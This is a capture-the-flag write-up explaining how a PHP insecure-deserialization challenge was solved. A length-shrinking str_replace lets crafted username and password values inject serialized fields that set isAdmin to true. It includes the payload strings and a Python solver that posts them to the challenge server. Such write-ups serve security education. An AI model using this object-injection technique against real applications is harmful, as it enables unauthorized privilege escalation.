---
title: ICMTC Finals - Puzzle 2
author: 0x41ly
classes: wide
ribbon: red
header:
  teaser: /assets/images/icmtc-logo.png 
date: 2023-07-17 06:00:00 +0800
categories: CTF
description: "no one has solved Puzzle 2 in ICMTC CSC CTF Finals..."
tags: [php, insecure-deserialization]
---


We were provided a source code:
```php
<?php

include 'flag.php';

session_start();
class Users
{
    protected $username;
    protected $password;
    private $isAdmin = false;
    private $id = '';

    public function __construct($username , $password)
    {
        $this -> username = $username;
        $this -> password = $password;
        $this -> isAdmin = false;
    }

    public function __isAdmin(){
        return $this -> isAdmin;
    }

    public function setUsername($username)
    {
        $this -> username = $username;
    }

    public function setPassword($password)
    {
        $this -> password = $password;
    }

    public function getUsername()
    {
        return $this -> username;
    }

    public function getPassword()
    {
        return $this -> password;
    }
}


isset($_GET['src']) ? highlight_file(__FILE__) : '';


if(isset($_POST['solve']))
{
    $user = new Users($_POST['username'],$_POST['password']);
    $_SESSION['user'] = serialize($user);

}
else
{
    if(!isset($_SESSION['user']))
        $user = new Users("EG-CERT","Hi!");
    else
    {
        $user = str_replace('XO', 'o', $_SESSION['user']);
        $user = unserialize($user);
    }

    if($user -> __isAdmin())
        echo $FLAG;
    else
        echo "Try Again !!";

}
?>
```

To read the Flag we must set the `isAdmin` to true 
#### **Obstacles** :
- we don't have control to the whole serialized object but only 2 variables that be used in serialization and unserialization.

#### Bypasses:
- we have a good hint here
	```php
	$user = str_replace('XO', 'o', $_SESSION['user']);
	```
	where we can manipulate the length of the serialized object before being serialized.

  #### Example 
  Lets at first see an example of a normal serialized object
  ```php
  $user= new Users("lol","lol");
  echo serialize($user);
// O:5:"Users":
//	4:{
//		s:11:"�*�username";
//			s:3:"lol";
//		s:11:"�*�password";
//  			s:3:"lol";
//		s:14:"�Users�isAdmin";
//			b:0;
//		s:9:"�Users�id";
//  			s:0:"";
//    }
```

It is very important to take care of the null bytes in the serialized object as they are considered as a part of the string length here.

#### MindSet
- We will try to manipulate the length of the serialized object before its being unserialized by using the `XO` hint
if we set the username to a `XOXOXOXOXOXO` the usernamestring will be considered as 12 byte long string but before unserialize the same object the XO will be replaced with "o" which will make the string itself 6 byte long but when unserialize the object the function will replace the missing 6 bytes with the next 6 bytes after the replacd string 
##### Example
Let's forget about the nullbytes now but we will need it later
```php
 $user = new Users("XOXOXOXOXO","");
O:5:"Users":4:
{
	s:11:"*username";
		s:10:"XOXOXOXOXO";
	s:11:"*password";
		s:0:"";
	s:14:"UsersisAdmin";
		b:0;
	s:9:"Usersid";
		s:0:"";
}
```

after this being replaced the object will be  like this
```php
O:5:"Users":4:
{
	s:11:"*username";
		s:10:"ooooo";s:1
	//and here it will gives you a parse error
	//1:"*password";
	//s:0:"";s:14:"UsersisAdmin";
	//b:0;s:9:"Usersid";s:0:"";}
```

What can we benefit from this?
We can force the serialized object to reconstruct itself so we can control the whole object.

The attack contains 2 parts.
##### First part -- Username
we will force the username to be equal `{n*o}";s:11:"�*�password";s:{password part payload length}:`

if we count the byte needed considering that the password payload is 2 digits long we need 26 bytes including the null bytes to be replaced so we will just write 26 `XO's`

```php
$user= new Users("XOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXO",
			"{there will be a payload here}");

O:5:"Users":4:
{
	s:11:"*username";
		s:52:"oooooooooooooooooooooooooo";s:11:"*password";s:30:"
		// here we can control the password payload
		{there will be a payload here}";s:14:"UsersisAdmin";b:0;s:9:"Usersid";s:0:"";}

```

and now it is obvious what we are going to do we will put the rest of the object n the password string.

 Second part -- Password
 What messing in the object is the Password field and the most important part which is `isAdmin` attribute 
 
 The final payload will be 
 ```php
 s:11:"�*�password";s:3:"lol";s:14:"�Users�isAdmin";b:0;s:9:"�Users�id";s:49:"
```

so when it be put all together the object look like 
``` php
O:5:"Users":4:{
	s:11:"*username";
		s:52:"oooooooooooooooooooooooooo";s:11:"*password";s:75:";
	s:11:"*password";
		s:0:"";
	s:14:"UsersisAdmin";
		b:1;
	s:9:"Usersid";
		s:49:"";s:14:"UsersisAdmin";b:0;s:9:"Usersid";s:0:"";
}

```

So if we created the object like this 
```php
$user = new Users("XOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXO",";s:11:\"\0*\0password\";s:0:\"\";s:14:\"\0Users\0isAdmin\";b:1;s:9:\"\0Users\0id\";s:49:\"");
$serialized= serialize($user);
$serialized2 = str_replace('XO', 'o', $serialized);
$unser_user = unserialize($serialized2);
echo var_dump($unser_user);
```

![](/assets/images/puzzle2/explain.png)

Now we reached our objective to make the `isAdmin=true`

solver.py
```python
from requests import post
from base64 import b64decode

url = "http://139.59.129.141:8087/"
payload = ';s:11:"\x00*\x00password";s:0:"";s:14:"\x00Users\x00isAdmin";b:1;s:9:"\x00Users\x00id";s:49:"'
body = {'solve': 'true', 'username': 'XOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXO', 'password': payload}

# res = post("http://localhost:8080", data=body)
res = post(url, data=body)

cookie = res.headers['Set-Cookie']

print(cookie)
res = post(url , headers={'Cookie': cookie})
print(res.text)
```


![](/assets/images/puzzle2/demo.jpeg)



---
Thanks for reading our writeup
